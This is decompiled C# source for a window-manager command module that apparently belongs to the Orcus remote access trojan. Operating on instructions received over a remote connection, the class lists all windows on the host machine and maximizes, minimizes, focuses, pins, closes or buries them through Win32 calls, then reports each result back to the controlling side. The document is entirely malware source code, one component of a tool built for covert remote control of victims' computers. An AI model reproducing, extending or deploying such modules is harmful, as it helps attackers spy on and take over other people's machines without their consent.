using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using Orcus.Native;
using Orcus.Plugins;
using Orcus.Shared.Commands.WindowManager;
using Orcus.Shared.NetSerializer;

namespace Orcus.Commands.WindowManager;

public class WindowManagerCommand : Command
{
	private static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);

	private static readonly IntPtr HWND_BOTTOM = new IntPtr(1);

	public override void ProcessCommand(byte[] parameter, IConnectionInfo connectionInfo)
	{
		//IL_0003: Unknown result type (might be due to invalid IL or missing references)
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		//IL_0006: Invalid comparison between Unknown and I4
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_000d: Invalid comparison between Unknown and I4
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_0014: Invalid comparison between Unknown and I4
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Invalid comparison between Unknown and I4
		//IL_0061: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Invalid comparison between Unknown and I4
		//IL_00a7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00aa: Invalid comparison between Unknown and I4
		//IL_00ac: Unknown result type (might be due to invalid IL or missing references)
		//IL_00af: Invalid comparison between Unknown and I4
		//IL_00b1: Unknown result type (might be due to invalid IL or missing references)
		//IL_00b4: Invalid comparison between Unknown and I4
		//IL_0110: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Invalid comparison between Unknown and I4
		//IL_0115: Unknown result type (might be due to invalid IL or missing references)
		//IL_0118: Invalid comparison between Unknown and I4
		WindowManagerCommunication val = (WindowManagerCommunication)parameter[0];
		if ((int)val <= 8)
		{
			if ((int)val <= 2)
			{
				if ((int)val == 0)
				{
					List<WindowInformation> allWindows = WindowManager.GetAllWindows();
					((Command)this).ResponseBytes((byte)1, new Serializer(typeof(List<WindowInformation>)).Serialize((object)allWindows), connectionInfo);
					return;
				}
				if ((int)val == 2)
				{
					bool result = NativeMethods.ShowWindow((IntPtr)BitConverter.ToInt64(parameter, 1), ShowWindowCommands.Maximize);
					ResponseResult(result, (WindowManagerCommunication)3, (WindowManagerCommunication)4, connectionInfo);
					return;
				}
			}
			else
			{
				if ((int)val == 5)
				{
					bool result = NativeMethods.ShowWindow((IntPtr)BitConverter.ToInt64(parameter, 1), ShowWindowCommands.Minimize);
					ResponseResult(result, (WindowManagerCommunication)6, (WindowManagerCommunication)7, connectionInfo);
					return;
				}
				if ((int)val == 8)
				{
					bool result = NativeMethods.SetForegroundWindow((IntPtr)BitConverter.ToInt64(parameter, 1));
					ResponseResult(result, (WindowManagerCommunication)9, (WindowManagerCommunication)10, connectionInfo);
					return;
				}
			}
		}
		else if ((int)val <= 14)
		{
			if ((int)val == 11)
			{
				bool result = NativeMethods.SetWindowPos((IntPtr)BitConverter.ToInt64(parameter, 1), HWND_TOPMOST, 0, 0, 0, 0, SetWindowPosFlags.IgnoreMove | SetWindowPosFlags.IgnoreResize | SetWindowPosFlags.ShowWindow);
				ResponseResult(result, (WindowManagerCommunication)12, (WindowManagerCommunication)13, connectionInfo);
				return;
			}
			if ((int)val == 14)
			{
				NativeMethods.PostMessage(new HandleRef(null, (IntPtr)BitConverter.ToInt64(parameter, 1)), WM.CLOSE, IntPtr.Zero, IntPtr.Zero);
				((Command)this).ResponseByte((byte)15, connectionInfo);
				return;
			}
		}
		else
		{
			if ((int)val == 16)
			{
				bool result = NativeMethods.ShowWindow((IntPtr)BitConverter.ToInt64(parameter, 1), ShowWindowCommands.Normal);
				ResponseResult(result, (WindowManagerCommunication)17, (WindowManagerCommunication)18, connectionInfo);
				return;
			}
			if ((int)val == 19)
			{
				bool result = NativeMethods.SetWindowPos((IntPtr)BitConverter.ToInt64(parameter, 1), HWND_BOTTOM, 0, 0, 0, 0, SetWindowPosFlags.DoNotActivate | SetWindowPosFlags.IgnoreMove | SetWindowPosFlags.IgnoreResize);
				ResponseResult(result, (WindowManagerCommunication)20, (WindowManagerCommunication)21, connectionInfo);
				return;
			}
		}
		throw new ArgumentOutOfRangeException();
	}

	private void ResponseResult(bool result, WindowManagerCommunication successResult, WindowManagerCommunication failedResult, IConnectionInfo connectionInfo)
	{
		//IL_0004: Unknown result type (might be due to invalid IL or missing references)
		//IL_0007: Unknown result type (might be due to invalid IL or missing references)
		//IL_000f: Expected I4, but got Unknown
		((Command)this).ResponseByte((byte)(int)(result ? successResult : failedResult), connectionInfo);
	}

	protected override uint GetId()
	{
		return 29u;
	}
}
